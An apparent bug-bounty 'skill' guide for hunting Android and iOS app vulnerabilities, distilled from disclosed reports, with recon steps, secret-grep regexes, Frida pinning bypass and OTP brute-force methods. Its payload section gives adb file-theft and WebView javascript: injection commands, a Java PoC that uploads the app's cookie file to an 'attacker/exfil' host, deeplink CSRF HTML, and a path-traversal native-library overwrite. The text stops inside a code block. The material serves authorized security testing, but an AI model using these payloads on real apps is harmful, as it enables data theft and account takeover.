---
name: hunt-mobile
description: Hunting skill for MOBILE APPLICATION (Android/iOS) vulnerabilities. Built from 143 full disclosed-report texts (185-report corpus): exported-component intent injection and file theft (ownCloud #377107, Quora #258460, Mattermost #1115864), WebView UXSS/JS-injection and cookie theft (Twitter Lite #499348, EXNESS #532836, Quora #189793, DoD #2555949), deeplink CSRF (Periscope Android/iOS #583987/#805073), hardcoded secrets and cloud credentials in APK/IPA (Reverb Cloudinary #351555, GlassWire Facebook #1641475, NordVPN #792850), open Firebase databases (Zego #1065134), OTP/2FA brute-force account takeover (Grab #202425/#205000), session-lifecycle failures (Shopify #1172205, Reddit #1632186), content-provider SQLi (Nextcloud #291764), attachment path-traversal RCE (Evernote #1377748), biometric/PIN bypass (Shopify #637194, Files iOS #2245437), client-side DoS (Twitter #500686/#784676), URL/origin spoofing (Brave #176929/#2501378), and dependency confusion (Aries #1763343). Use when the target has a mobile app in scope, when recon surfaces a Play Store developer page or APK/IPA, when a web program also lists Android/iOS, or when a "mobile companion app" appears in scope. Static + dynamic: decompile the binary, enumerate exported components, intercept mobile API traffic, validate every extracted secret.
sources: hackerone_public, topmobile_lists, apk_redteam_pipeline, disclosed_full_text_corpus
report_count: 185
full_reports_read: 143
---

## Crown Jewel Targets

Mobile is highest-value when the app is a **privileged client of a web API** — the binary ships secrets, the UI layer trusts unvalidated intent/deeplink input, and the mobile auth/session endpoints are weaker than their web counterparts. Priority targets, ranked by how often they produced a real bounty in the 143 reports:

- **Apps with exported components** (`android:exported="true"`, implicit export via `intent-filter`, browsable activities/services/receivers/providers) — the single richest surface. Real files got stolen through `ReceiveExternalFilesActivity` (ownCloud #377107, #161710), a share `UploadService` (Quora #258460), and a share `ShareActivity` (Mattermost #1115864). Any second app on the device can drive these.
- **Apps whose WebView loads a URL from intent/deeplink data** — `file://` local-file reads, `javascript:` URI execution, and open redirects land here (Twitter Lite #499348, EXNESS #532836, Quora #189793, DoD #2555949, Zomato Business #537670, GitHub Security Lab #1011956).
- **Apps with a lock/biometric/PIN screen** — bypassable via deeplink while the app is open (Shopify #637194), via unlimited PIN brute-force (Files iOS #2245437), or via runtime method invocation (Coinbase #80512).
- **Apps that ship secrets in the binary** — Cloudinary API secret (Reverb #351555), Facebook App secret (GlassWire #1641475), hardcoded API keys (Zenly #753868, NordVPN #792850), leaked OAuth response codes in `logcat` (Coinbase #5314, Grammarly #462416), and full Firebase configs in `strings.xml` (Zego #1065134).
- **Mobile auth endpoints (login / OTP / 2FA / password-reset / phone-number attachment)** — weaker rate limiting than web. The canonical ATO: reset endpoint has no rate limit but activation allows only 3 tries → 8,640 attempts/day against a 4-digit code (Grab #202425, #205000); the mobile login API has no brute-force protection where web does (New Relic #127202, Instacart #160109).
- **Session-lifecycle seams** — logout returns `{"error":"Missing Logout Token Hint"}` but the token stays live (Shopify #1172205); revoking app access on the web does not kill the mobile session (Reddit #1632186); password change / "Expire User Sessions" does not log out Android/iOS (Shopify #55530/#194329/#67220).
- **Custom URL schemes / deep links that trigger state changes** — follow a user (Periscope #583987/#805073), start a Facetime call (Twitter #28500), or write arbitrary files (MetaMask #1768166) without CSRF protection.
- **Content providers** — SQL injection (Nextcloud #291764, Mail.ru #887968), exposed bcrypt share hashes (Nextcloud #242727), and internal-only providers reachable by third-party apps (Dropbox #272044).
- **File-upload / attachment-rename paths** — path traversal to native-library overwrite → 2-click RCE (Evernote #1377748), ZIP extract traversal (LINE #859469), iOS path traversal (VK #1050231), share-file write into app root (Nextcloud #1997029).
- **Browser-on-mobile and embedded-browser UI** — address-bar / URL eliding spoofing (Brave #176929/#2501378/#175958), CSP not enforced (MetaMask Browser #1941767), external-link warning domain highlighting (HackerOne #2553026).
- **Cloud misconfig reachable from binary intel** — public Firebase RTDB/Firestore (Zego #1065134), exposed AWS bucket with iOS test build + config (Slack #404822), leaked Google Maps/Stripe keys (#488371, #792850).
- **On-device data at rest in world-readable/shared dirs** — Nextcloud privacy dir leak (#1142918), shared `Android/media` folder (#462441), unprotected broadcasts leaking location (Twitter #185862) and upload events (Nextcloud #167481).

Payouts in this corpus topped out at **$10,000** (Mail.ru notification-center email disclosure #977212) and **$5,000** (Pornhub weak auth #138101). The most reliable *volume* came from exported components, hardcoded secrets, and OTP/session flaws.

### Fast signal → bug-class triage

Use this to decide where to spend the first hour once a target is in scope:

| Observation in scope | Most likely bug class | Representative report |
|---|---|---|
| "Companion app" / Play Store dev page with several packages | Exported components, leaked secrets, weak mobile API | #637194, #753868, #205000 |
| APK hosts a file on a web server / found via `*.apk` URL | Static secret extraction, internal endpoint inventory | #351555, #848905 |
| App has a lock screen / biometric / PIN | Deeplink or runtime auth bypass | #637194, #2245437, #80512 |
| App has "share", "upload", "attach", or "rename" flows | Path traversal → file theft / RCE | #1115864, #258460, #1377748 |
| App has a built-in browser / WebView / "open in app" | UXSS, JS injection, cookie theft, address-bar spoofing | #499348, #532836, #906433, #176929 |
| App does login / OTP / 2FA / phone verification | ATO via rate-limit / code-expiry flaws | #202425, #205000, #2762462 |
| "Track my order", "waitlist", "redeem", "favourited" style endpoints | IDOR / metadata leak / enumeration | #902733, #125707, #203042 |
| Push notifications / notification center | Private content rendered to lockscreen / third party | #977212, #1632186 |
| React Native / hybrid app (JS bridge) | XSS → bridge → native, unsafe resource loading | #189793, #1011956, #1763343 |
| Crypto / wallet / trading app | Origin spoofing, WebView cookie theft, transaction spoofing | #1751333, #532836, #1941767 |

### Scope traps to avoid

- **A hardcoded value is not automatically a finding.** Many reports note that API keys are "widely available" or publishable; the bounty comes when the key grants real authority (Cloudinary full access #351555, Facebook App secret able to modify settings #1641475). Always validate live.
- **Client-side-only issues need a concrete victim.** An app that "does not enforce SSL" matters only if traffic carries auth material (#5786); a local boolean edit that never reaches the server is intel, not impact (#165561).
- **DoS is real but price it honestly.** Persistent, unrecoverable app breakage (#784676, #500686, #832217) is reportable; a one-frame glitch is not. Show that the victim cannot recover without web intervention.
- **Version matters.** Report the exact package version and store build; several fixes were incomplete or version-specific (Periscope #583987 → #805073; "found that #90693 was fixed incompletely" #226191).

---

## Attack Surface Signals

### Manifest / Binary Patterns (Android)
```
android:exported="true"          # activity, service, receiver, provider
<intent-filter> ... <category android:name="android.intent.category.BROWSABLE"/>
<data android:scheme="..." android:host="..." android:pathPrefix="..."/>
<data android:mimeType="*/*"/>   # SEND / SEND_MULTIPLE share activities
android:permission (ABSENT)      # exported component with no permission guard
android:allowBackup="true"       # data extractable via adb backup
android:usesCleartextTraffic="true"
```

### WebView Sinks (decompiled source)
```java
getIntent().getDataString()          // URL taken straight from intent
getStringExtra("URL") / "url" / "smSPageURL"
webView.getSettings().setJavaScriptEnabled(true)
webView.loadUrl(attackerControlled)
webView.loadDataWithBaseURL(baseUrl, html, ...)
addJavascriptInterface(obj, "...")   // JS bridge → native
shouldOverrideUrlLoading(...)        // missing scheme allowlist
setWebViewClient / setWebChromeClient without validation
```

### Deeplink / Custom-Scheme Patterns
```
pscp://user/<id>/follow             # Periscope CSRF #583987
pscpd://broadcast/...               # Periscope #583987
mymos://app/feedback  (S.URL=...)   # DoD WebView #2555949
facetime-audio://user@host          # iOS URL-scheme abuse #28500
intent://...#Intent;scheme=...;package=...;end
javascript:<payload> / file:///data/data/...
```

### Secret / URL Grep Signals (strings.xml, DEX, resources)
```
AKIA[A-Z0-9]{16}                    # AWS access key
AIza[A-Za-z0-9_-]{35}               # Google API key
eyJ[A-Za-z0-9_-]+\.eyJ...\.         # JWT
cloudinary://<id>:<secret>@<cloud>  # Reverb #351555
googleservices / firebase_database_url / .firebaseio.com
client_secret / facebook App Secret # GlassWire #1641475
https?://10\.|172\.|192\.168\.|127\.  # internal endpoints
```

### Mobile API / Traffic Signals
- A **mobile-only** auth/login endpoint that lacks CAPTCHA/rate limiting while `/login` web has it (New Relic #127202).
- OTP `resend` endpoint with no global rate limit but an `activate/verify` endpoint with a small attempt cap (Grab #202425).
- Responses that leak metadata (user country/name/photo on promo-code enumeration — Uber #125707; all waitlist mobile numbers — Curve #902733).
- JSON body flags flipped client-side (`allowNotActivated:false → true` — Uber #126260; boolean local attribute updates — Uber #165561).
- Tokens in query strings (`?auth_token=[token]` — Grab #221558) and in `logcat` (Coinbase #5314).
- Missing cert validation / no pinning (Coinbase #5786, Twitter iOS #168538, Shopify POS #55644).

### Response / Behavior Signals
- Error-state differences that enumerate info: last-2-digits of a phone number, then "exceeded number of attempts" (Twitter #1225164).
- App crash on special characters: `\0` NUL byte in a DM reaction (Twitter iOS #784676), invalid `%xx` in mobile site URL (Twitter #500686), unicode `0x0e/0x0f` (LINE #1058383).
- NotificationCenter / push payload rendering private content (Mail.ru #977212, Reddit #1632186).

### iOS-Specific Signals
```
UIApplication sharedApplication openURL:        # custom scheme handling
WKWebView / UIWebView loadRequest / loadHTMLString
javaScriptEnabled = true                        # unsanitized WebView #575562
WKPreferences / javaScriptEnabled               # recommendation: disable JS
application:openURL:options:                    # deeplink entry point
URLScheme / CFBundleURLTypes in Info.plist      # scheme enumeration
snoop-it / Frida on Objective-C classes          # runtime PIN bypass #80512
```
- App Transport Security exceptions (`NSAllowsArbitraryLoads`) → cleartext endpoints (#12977, #2101).
- iOS test builds / source in public S3 buckets (#404822); iOS address-bar spoofing (#176929, #215044) and URL eliding (#2501378).

### Notification / Push / Broadcast Surfaces
- Push payload or notification body contains private content (emails #977212, chat invites / revoked-session revival #1632186).
- `sendBroadcast` without permission → location leaked to any installed app (#185862).
- `registerReceiver` without `broadcastPermission` → malicious apps can drive the receiver (#1596459).
- Implicit `CREATE_REQUEST` broadcast unprotected (#180349); upload-status broadcast interceptable (#167481).

### Signup / Phone-Binding / Account-Recovery Surfaces
- Add/verify any mobile number without current code (#667740), attach any number to any email (#18992), uncontrolled number-add → ATO (#2762462).
- Signup email-validation bypass (#57764); password change without re-auth (#207552); deactivated staff still logs in (#175490).
- Password-reset / OTP flows that leak the last digits then rate-limit (#1225164), or that count attempts per-endpoint inconsistently (#202425).

### Tooling Quick Reference
```
# Static
jadx -d decompiled/ app.apk
apktool d app.apk -o decoded/
strings -8 classes*.dex > strings.txt
openssl x509 -in cert.cer -noout -subject -issuer -dates
# Dynamic (Android)
adb shell am start -n pkg/Activity -d "<uri>"
adb shell am broadcast -a <action>
drozer console connect -> run scanner.provider.injection -a <pkg>
frida -U -l pinning-bypass.js -f <pkg> --no-pause
mitmproxy --listen-port 8080   (+ system CA on rooted device)
# Dynamic (iOS)
SnoopIt / Frida Objective-C method invocation
Burp transparent proxy via rogue WiFi CA (#168538)
```

---

## Discovery Patterns From 143 Full Reports

### Where Researchers Start (ranked recon surfaces w/ "what to look for")

1. **Decompiled `AndroidManifest.xml`** — *what to look for*: every `android:exported="true"` component, implicit exports via `intent-filter`, `BROWSABLE` categories, custom schemes and `pathPrefix` values, and **missing** `android:permission`. This is the #1 starting point for file theft and intent-injection reports (#377107, #499348, #1115864, #258460, #200427, #145402).
2. **Intercepted mobile API traffic (Burp / mitmproxy)** — *what to look for*: endpoints the web app never exposes, parameter names, token headers (`x-mts-ssid`, `authorization: Bearer`), and rate-limit / code-expiration behavior. Researchers repeatedly found the vulnerable endpoint "using android app" (#205000, #202425) or while monitoring a MITM (#5786, #902733).
3. **Binary strings & resources (jadx / `strings`)** — *what to look for*: API keys, secrets, JWTs, cloudinary/firebase config, internal hostnames, `/v1/*` endpoint inventories. "==I found a bunch of API keys,Tokens.==" (#753868); "in `res/values/strings.xml`" (#1065134).
4. **Deep-link / custom-URL-scheme enumeration** — *what to look for*: schemes that perform a state change (follow, like, delete, pay, write file) with no confirmation UI. Periscope `pscp://user/<id>/follow` (#583987), MetaMask arbitrary file write (#1768166).
5. **WebView configuration review** — *what to look for*: `setJavaScriptEnabled(true)` combined with a URL/HTML extra that comes from an intent. Exported activity + browsable = third parties can inject `javascript:`/`file://` (#499348, #537670, #2555949, #1011956).
6. **Content-provider enumeration (Drozer)** — *what to look for*: exported providers and SQLi in `projection`/`selection` arguments (#291764, #887968), or globally available providers exposing hashes (#242727).
7. **Play Store / developer-page inventory** — *what to look for*: all packages under the brand, version history (older versions sometimes leak what newer ones removed), and companion apps. Precedes most APK-based work.
8. **Public code search (GitHub / leaked test builds)** — *what to look for*: source repos, config files, `google-services.json`, and exposed storage buckets with test builds (#404822, #1167916, #167481).
9. **OTP / 2FA / reset / phone-number endpoints** — *what to look for*: missing rate limits, codes that never expire, phone numbers attachable without proof (#202425, #205000, #2762462, #667740, #18992).
10. **Session lifecycle across web↔mobile** — *what to look for*: logout/revoke/password-change that does not invalidate the mobile token (#1172205, #1632186, #55530, #194329, #67220, #7041).
11. **Shared storage / cache directories** — *what to look for*: world-readable files under `/sdcard/Android/...`, caches, and shared prefs with accounts/tokens (#1142918, #462441, #272044, #44727).
12. **iOS / Android runtime manipulation** — *what to look for*: bypassing PIN/biometrics by invoking methods directly with SnoopIt/Frida (#80512) or via a deeplink while the app is open (#637194).
13. **Client-side validation flags** — *what to look for*: booleans/attributes enforced only in the app (`allowNotActivated`, local profile edits) and trusted by the server (#126260, #165561).
14. **Browser-on-mobile / embedded-browser UI** — *what to look for*: address-bar eliding, CSP enforcement, domain highlighting, and human-verification interstitials on mobile user agents (#176929, #2501378, #1941767, #2553026, #288596).
15. **Dependency manifests** — *what to look for*: private package names not on public registries that an attacker can register (dependency confusion — #1763343).

**Recon surface → primary tool → first output:**

| Surface | Tool | First artifact you should obtain |
|---|---|---|
| Play Store developer page | `curl` + `grep -oE 'id=[a-zA-Z0-9._]+'` | Package-ID list (often 5–8 packages for a multi-brand org) |
| APK acquisition | APKPure / APKMirror / `7z x` for split XAPK | A decompilable `base.apk` (note the version) |
| Manifest review | `apktool d` + jadx resources | Exported-component + scheme inventory |
| Secret grep | `strings` + regex catalog | Candidate keys/URLs/JWTs to validate |
| Traffic capture | mitmproxy / Burp + pinning bypass | Endpoint list + auth headers + rate-limit behavior |
| Component driving | `adb am` / a PoC app / Drozer | One-command proof of file read / JS exec / write |
| Deep links | hosted HTML `<a href>` / QR | State-change proof with no confirmation |
| Cloud config | `curl` to Firebase/Firestore/Storage/bucket | Live read/write proof |
| Session replay | Burp repeater | Token accepted after revoke/logout |

**Why "where researchers start" is itself evidence:** nearly every verbatim clue in the next subsection is a *starting observation*, not a finished exploit — "I found the endpoint using android app," "going through all the JS files," "when monitoring requests during the man in the middle attack," "while registering," "when renaming I founded." The skill is in following the observation to a demonstrated impact.

### Feature-Based Discovery Signals (frequency-ranked table)

Ranked by number of full reports containing the signal in the corpus. "Why it matters / what to probe" is translated into concrete mobile action.

| Rank | Feature / Signal | Reports | Why it matters / what to probe |
|---:|---|---:|---|
| 1 | search-filter-sort | 38 | Reflected input lands in a UI/WebView preview → probe `search`/`category` params for stored/reflected XSS in the mobile page (#380246, #230119, #379705). |
| 2 | server-side-rendering | 33 | App renders attacker-controlled HTML server-side or in WebView → probe template/HTML extras for XSS and JS-bridge access (#189793, #242727). |
| 3 | api-endpoint | 26 | The mobile API is a separate, weaker surface → enumerate `/v1/*`, `/api/passenger/v2/*` from the binary and probe auth/rate-limit (#202425, #902733, #203042). |
| 4 | filter-bypass | 23 | Path/host/PIN filters are bypassable → try `/data/user/0/` vs `/data/data/`, host-validation tricks, unlimited PIN retries (#377107, #431002, #2245437). |
| 5 | xml-parser | 19 | Manifest / `strings.xml` / content-provider XML is where secrets and exports live → decompile and grep (#1065134, #792850, #242727). |
| 6 | image-processing | 19 | Image previews leak IPs and crash apps → probe URL-based image fetches and crafted reaction/media content (#736800, #784676). |
| 7 | public-code-search | 17 | Source/config/test builds leak publicly → search repos and storage buckets (#404822, #1167916). |
| 8 | brute-otp-reset | 15 | OTP codes brute-forceable → test rate limits, code expiry, resend loops, 4-digit space (#202425, #205000, #127202, #160109). |
| 9 | comment-injection | 13 | User content stored then rendered → probe notes/comments/messages for stored XSS and file-path injection (#161710, #1377748). |
| 10 | session-attack | 13 | Mobile tokens outlive web revocation → test logout, password change, "expire sessions", revoke app access (#1172205, #1632186, #55530). |
| 11 | cache-layer | 13 | Cached/shared files readable by other apps → check file permissions and cache dirs (#272044, #462441, #1142918). |
| 12 | sso-oauth | 12 | OAuth code/token handling flawed → check `logcat` leakage, `id_token` audience validation, client secrets in binary (#5314, #202177, #1641475). |
| 13 | cookie-handling | 12 | Cookies in WebView/traffic → probe MITM with untrusted CA, cookie theft via UXSS (#168538, #532836, #1172205). |
| 14 | redirect-handling | 10 | Open redirects / URL-scheme rewrites → probe `file:`, `javascript:`, external domains in intent data (#499348, #2555949, #175958). |
| 15 | admin-internal | 10 | Admin-only actions/tokens exposed to mobile clients → probe upgrade menus and role flags (#447975, #194329). |
| 16 | proxy-feature | 10 | Traffic interception exposes flaws → run mitmproxy/Burp against the app (#55644, #5786, #126260). |
| 17 | file-upload | 10 | Upload/rename paths with traversal → probe `../../../lib*.so` and MIME-type confusion (#1377748, #97295, #575562). |
| 18 | stored | 8 | Persisted malicious content → share HTML/messages and wait for victim to open (#575562, #351555). |
| 19 | subdomain-takeover | 8 | Signup/account-binding logic → probe email/password overwrite flows (#187714, #205000). |
| 20 | dos-resource | 8 | Client/server DoS via crafted input → fuzz NUL bytes, unicode, huge/odd URLs (#500686, #784676, #832217, #1058383). |
| 21 | misconfiguration | 7 | Open buckets, permissive Firebase, wrong defaults → test cloud config from binary intel (#404822, #1065134, #1167916). |
| 22 | path-traversal-lfi | 6 | Exported activity accepts a URI → supply `file:///data/user/0/...` (#377107, #1142918, #1377748). |
| 23 | csrf | 5 | Deeplink triggers state change without token → craft `<a href="scheme://...">` (#583987, #805073, #28500). |
| 24 | js-source-review | 5 | Review JS/DEX for sinks → grep `loadUrl`, `getDataString`, fetch calls (#1941767, #404822). |
| 25 | json-body | 5 | Body parameters trusted → flip booleans, inject fields (#202425, #12977). |
| 26 | link-preview | 5 | Preview fetchers leak/crash → probe crafted content and internal addresses (#1377748, #784676). |
| 27 | cloud-metadata | 4 | Server-side app endpoints reaching cloud metadata → chain via exposed media/storage (#125707, #746541, #462441). |
| 28 | debug-error-leak | 4 | Stack traces/logs leak paths and methods → read `logcat`, error bodies (#80512, #242727). |
| 29 | url-fetching | 3 | App fetches attacker URLs → SSRF-style local file disclosure on iOS (#746541, #902733). |
| 30 | auth-bypass | 3 | Deactivated/unactivated accounts can log in → flip server response flags (#175490, #202177, #126260). |

### Verbatim Discovery Clues (18 real quotes)

Direct "how I found it" lines from disclosed report text (`[#id]` tags preserved):

> [#377107] I have found an issue which allows to retrieve any files from `/data/data/com.

> [#351555] I was able to access your account data

> [#902733] com I found a link called "/usa" is used to create Curve USA Waitlists by entering your name, email address, mobile number and address details.

> [#205000] After my previous report about 2FA bypass on the Profile Edit endpoint i was interested to find enpoint, which will allow me horizontal privileges escalation.

> [#205000] So, I found the endpoint using android app `https://p.

> [#1115864] In this poc the app will crash on next launch because i was too lazy and to create a modified version of `libyoga.

> [#753868] ==I found a bunch of API keys,Tokens.

> [#202425] I found the endpoint using android app `https://p.

> [#221558] When vieving "Notifications" section on the app, i noticed the unsecure GET request to the `https://grab-attention.

> [#161710] I have found an issue which allows to retrieve any files from **_/data/data/com.

> [#1377748] When renaming i founded that special characters are not restricted,for example file uploaded with name `libjnigraphics.

> [#575562] I found a Blind XSS can executed on iOS App due to unsanitized webview.

> [#1632186] I clicked on that and I was surprised that I was able to use the previously revoked user account again in the Reddit app.

> [#746541] The tester access that file and found the application path to use for SSRF local file disclosure.

> [#80512] CBPINViewController I was able to break the PIN protection

> [#1763343] I found that your agent depends on the package "aries-bifold" that is not currently present in the public repository; an attacker could upload its malicious package and then gain remote code execution on every target installing

> [#200427] @bagipro found a vulnerability wherein a malicious and unprivileged app on the victim's phone could interact with any activity in the Slack Android app, allowing manipulation of the app in unintended ways.

> [#5786] It is visible in many requests made by the device when monitoring requests during the man in the middle attack.

### Probe Checklist (15 concrete probes)

1. **Enumerate exports:** `apktool d app.apk` then `grep -E 'android:exported="true"|<intent-filter|BROWSABLE' AndroidManifest.xml` — list every externally reachable component.
2. **Probe an exported file-accepting activity:** send `adb shell am start -n <pkg>/<Activity> -d "file:///data/user/0/<pkg>/databases/<db>"` with `FLAG_GRANT_READ_URI_PERMISSION` (#377107).
3. **Probe an exported WebView activity:** `adb shell am start -n <pkg>/<Activity> -d "javascript:alert(1)"` and `-d "file:///sdcard/1.html"` and an external `https://` URL (#499348).
4. **Probe a URL extra:** `adb shell am start -n <pkg>/<WebViewActivity> --es URL "javascript:..." ` and via an `intent://...S.URL=...;end` link (#2555949).
5. **Test SEND/SEND_MULTIPLE share activities:** craft an intent with `android.intent.extra.STREAM` pointing at app-private files (#1115864, #258460).
6. **Test deeplink CSRF:** host `<a href="scheme://user/<id>/follow">click</a>` and confirm the state change fires with no user confirmation (#583987, #805073).
7. **Test biometric/PIN bypass while app is open:** trigger a deeplink to a privileged activity; try unlimited 4-digit PIN brute-force; try direct method invocation with Frida/SnoopIt (#637194, #2245437, #80512).
8. **Grep the binary for secrets:** `strings classes*.dex | grep -E 'AKIA|AIza|eyJ|cloudinary://|firebaseio|client_secret'`; check `res/values/strings.xml` and `google-services.json` (#351555, #1065134, #1641475).
9. **Validate every extracted secret:** `curl` the Cloudinary usage endpoint, `aws sts get-caller-identity`, `firebaseio.com/.json`, Facebook Graph token exchange — prove it still works (#351555, #1641475).
10. **Test OTP/2FA brute-force:** send N resend requests then N×3 activation attempts; measure code space and rate limits (#202425, #205000).
11. **Test session lifecycle:** log out / change password / revoke app access / "expire sessions", then replay the original `Bearer` token against `/oauth/userinfo` or the app API (#1172205, #1632186, #67220).
12. **Enumerate content providers with Drozer:** `run scanner.provider.injection -a <pkg>` and `run scanner.provider.finduris -a <pkg>` (#291764, #887968).
13. **Test path traversal in filenames:** rename an attachment to `../../../lib/<native-lib>.so` and trigger the preview/download path (#1377748, #1997029).
14. **Test client-side-only flags:** intercept with Burp and flip `allowNotActivated:false→true` (plus response match/replace) or local boolean attributes (#126260, #165561).
15. **Test crafted input for client DoS:** inject `\0`, `\r\n`, invalid `%xx`, and unicode `0x0e/0x0f` into DM reactions, messages, and URLs; observe crash/persistent breakage (#784676, #500686, #832217, #1058383).

---

## Step-by-Step Hunting Methodology

Five phases, each with a stop condition so you don't over-invest in a dead surface:

| Phase | Steps | Stop condition / gate |
|---|---|---|
| Recon & acquire | 1–3 | Have a decompilable binary + version for at least one in-scope package |
| Static triage | 4–6 | Have a ranked list of exported components, secrets, and endpoints — each secret validated live |
| Dynamic confirmation | 7–13 | Have at least one reproducible malicious input that changes state, reads data, or breaks the client |
| Impact & minimization | 14 | One-command / one-request PoC with a named victim loss |
| Reporting | 15 | Gate 0 passed; exact version and reproduction included |

1. **Inventory all org-owned apps.** Scrape the Play Store developer page (`https://play.google.com/store/apps/developer?id=<Brand>`) for package IDs, cross-reference stealer logs (`*@com.<brand>.<app>`), and guess brand permutations. Note version history on APKMirror — older builds sometimes leak secrets newer builds removed.

2. **Acquire the binary.** Primary `https://d.apkpure.net/b/APK/<package_id>?version=latest`; fall back to APKMirror. Handle `.xapk` by unzipping outer then inner split APKs (`7z x` for truncated CDN downloads). For iOS, use IPA from App Store/decrypted dump where in scope.

3. **Decompile.** `jadx -d decompiled_<pkg>/ <pkg>.apk`; `apktool d` for the binary manifest; `strings -8 classes*.dex > strings.txt` for a fast pass. Read `AndroidManifest.xml`, `network_security_config.xml`, `google-services.json`, `res/values/strings.xml`.

4. **Map the component surface.** List all exported activities/services/receivers/providers and their intent filters. For each, trace what intent extras/data flow into a WebView, a URI loader, a file path, or another Activity (intent redirection). This is the highest-yield static pass.
   - Build a table: `component | exported? | permission? | input source | sink | candidate bug`.
   - Prioritize components accepting `STREAM`/`URI`/`URL`/`html` extras — these are the file-theft and XSS sinks (#377107, #189793, #537670).
   - Check `android:launchMode` / `taskAffinity` — `singleInstance` share activities were central to the Mattermost ACE (#1115864).
   - For each `BROWSABLE` activity, test whether a web page (`<a href>` / iframe) can reach it, not just another app (#28500, #805073).

5. **Grep for secrets and endpoints.** Run the pattern catalog (secret/URL signals). Decode any JWT (`eyJ...`), note algorithm and claims. Inventory internal `/v1/*` and `api.<brand>.<tld>` endpoints. Extract pinned certs (`openssl x509 -subject -issuer -dates`) — SANs reveal hidden internal hosts.

6. **Validate static finds before reporting.** A hardcoded key is only a bug if it authenticates. Test Cloudinary/Firebase/AWS/Facebook/Google keys against their live APIs. Treat expired JWTs as intel (path structure, endpoint list), not dead ends.

7. **Stand up dynamic interception.** Install the app on a rooted emulator/test device. Configure mitmproxy/Burp; install the CA as a system cert or use a Frida pinning-bypass script (`okhttp3.CertificatePinner.check`, `TrustManagerImpl.verifyChain`). For iOS, trust the Burp CA on a non-jailbroken device via rogue WiFi + transparent proxy as in #168538.

8. **Intercept all mobile API calls.** Compare mobile auth/rate-limit behavior against the web app. Look for the weaker mobile login endpoint (#127202), brute-forceable OTP (#202425), enumerable promo codes (#125707), and metadata leaks (#902733, #1225164).

9. **Drive the exported components.** Use `adb shell am start` for activities, `am broadcast` for receivers, and a small PoC app or Drozer for providers/services. Replay the exact intent that the decompiled code expects. Prefer a file:// URI, javascript: URI, or an app-private path.

10. **Test WebView and deeplink flows.** Inject `javascript:`, `file://`, and external URLs into every URL-bearing extra. Host an HTML page with `<a href="<scheme>://...">` for CSRF/deeplink tests. Verify JS bridge exposure and cookie access (#189793, #532836).

11. **Test auth/session/state seams.** Enumerate OTP attempts, flip JSON booleans, replay tokens after logout/revoke, and test signup/phone-number/email binding logic for account overwrite (#187714, #2762462).

12. **Test file handling and content rendering.** Rename uploads with traversal sequences, share malicious HTML and open it as the victim (blind stored XSS #575562), and fuzz message/notification content for crashes and disclosure.
   - Attachment rename: try `../../../lib/<native>.so` and `../../cache/preview/...` (#1377748).
   - Content providers: Drozer `scanner.provider.injection` for SQLi, `scanner.provider.finduris` for reachable URIs (#291764, #887968).
   - Push/notification: check whether private content renders on the lockscreen / in notification center (#977212, #1632186).
   - Broadcasts: register a receiver with high priority for actions you saw in the manifest; see what leaks (#167481, #185862).

13. **Test cloud/firebase config.** From `firebase_database_url`/`project_id`, probe `https://<project>.firebaseio.com/.json`, Firestore REST, and Storage bucket listing (#1065134). Check any exposed bucket/test build (#404822).
   - `web_api_key` + `project_id` may also enumerate Firebase tenant config and public Firestore collections.
   - Pinned-cert SANs and internal hostnames from the binary are asset-discovery leads, not just pinning notes.

14. **Confirm impact and minimize the PoC.** Reduce to the smallest reliable reproduction (one adb command or one HTTP request). For secrets, show a live API response. For session bugs, show the token still working. For crashes, show persistent unusability.

15. **Document and report.** Include binary version, package ID, exact extraction/reproduction steps, and screenshots of each hop. Frame mobile-static findings carefully (engineers may call them "just obfuscation") — show the concrete attacker capability and victim loss.

---

## Payload & Detection Patterns

### Intent / Exported-Component Probes (adb)
```bash
# Local file theft via exported activity (#377107, #161710)
adb shell am start -n com.owncloud.android/com.owncloud.android.ui.activity.ReceiveExternalFilesActivity \
  -d "file:///data/user/0/com.owncloud.android/databases/filelist"

# WebView javascript: injection / open redirect (#499348)
adb shell am start -n com.twitter.android.lite/com.twitter.android.lite.TwitterLiteActivity \
  -d "javascript://example.com%0A alert(1);"
adb shell am start -n com.twitter.android.lite/com.twitter.android.lite.TwitterLiteActivity \
  -d "file:///sdcard/BugBounty/1.html"
adb shell am start -n com.twitter.android.lite/com.twitter.android.lite.TwitterLiteActivity \
  -d "http://evilzone.org"

# WebView URL-extra injection (#2555949)
adb shell am start -n <pkg>/.kotlin.MVVM.Utils.Web.WebviewActivity \
  --es URL "javascript:(function(){alert('XSS')})();"

# XSS via HTML extra into Quora WebView (#189793)
adb shell am start -n com.quora.android/com.quora.android.ActionBarContentActivity \
  -e url 'http://test/test' -e html '<script src=//attacker/x.js></script>'
```

### PoC Malicious-App Intent (Java)
```java
// File theft via SEND intent with grant-read-uri flag (#377107)
StrictMode.VmPolicy.Builder builder = new StrictMode.VmPolicy.Builder();
StrictMode.setVmPolicy(builder.build());
Intent intent = new Intent("android.intent.action.SEND");
intent.setClassName("com.owncloud.android",
    "com.owncloud.android.ui.activity.ReceiveExternalFilesActivity");
intent.setType("*/*");
intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
intent.putExtra("android.intent.extra.STREAM",
    Uri.parse("file:///data/user/0/com.owncloud.android/databases/filelist"));
startActivity(intent);

// Exported UploadService → send arbitrary app-private file to attacker (#258460)
UploadTaskParameters params = new UploadTaskParameters();
params.setId("1337");
params.setServerUrl("http://attacker/exfil");
params.addFile(new UploadFile("/data/data/com.quora.android/app_webview/Cookies"));
Intent i = new Intent("net.gotev.uploadservice.action.upload");
i.setClassName("com.quora.android", "net.gotev.uploadservice.UploadService");
i.putExtra("taskParameters", params);
startService(i);
```

### Deeplink / URL-Scheme CSRF (HTML)
```html
<!-- Periscope follow CSRF (#583987, #805073) -->
<a href="pscp://user/<victim-id>/follow">CSRF DEMO</a>

<!-- iOS URL scheme auto-launch from iframe (#28500) -->
<iframe src="facetime-audio://victim@example.com"></iframe>

<!-- intent:// URL with URL extra (#2555949) -->
<a href="intent://app/feedback#Intent;scheme=mymos;package=<pkg>;S.URL=javascript:alert(1);end">Open</a>
```

### Path-Traversal / File-Write Payloads
```
# Attachment rename → native lib overwrite → RCE (#1377748)
libjnigraphics.so  ->  ../../../lib/libjnigraphics.so
# App-private DB theft via exported activity (#161710)
file:///data/data/com.harvestapp/databases/harvest.db
# Path filter bypass: use the symlinked user id path (#377107)
/data/user/0/<pkg>/...    instead of    /data/data/<pkg>/...
# iOS path traversal / arbitrary file write via deeplink (#1768166, #1050231)
```

### Secret / Endpoint Grep & Validation
```bash
# Strings from DEX
find extracted -name "classes*.dex" -exec strings -8 {} \; > strings.txt
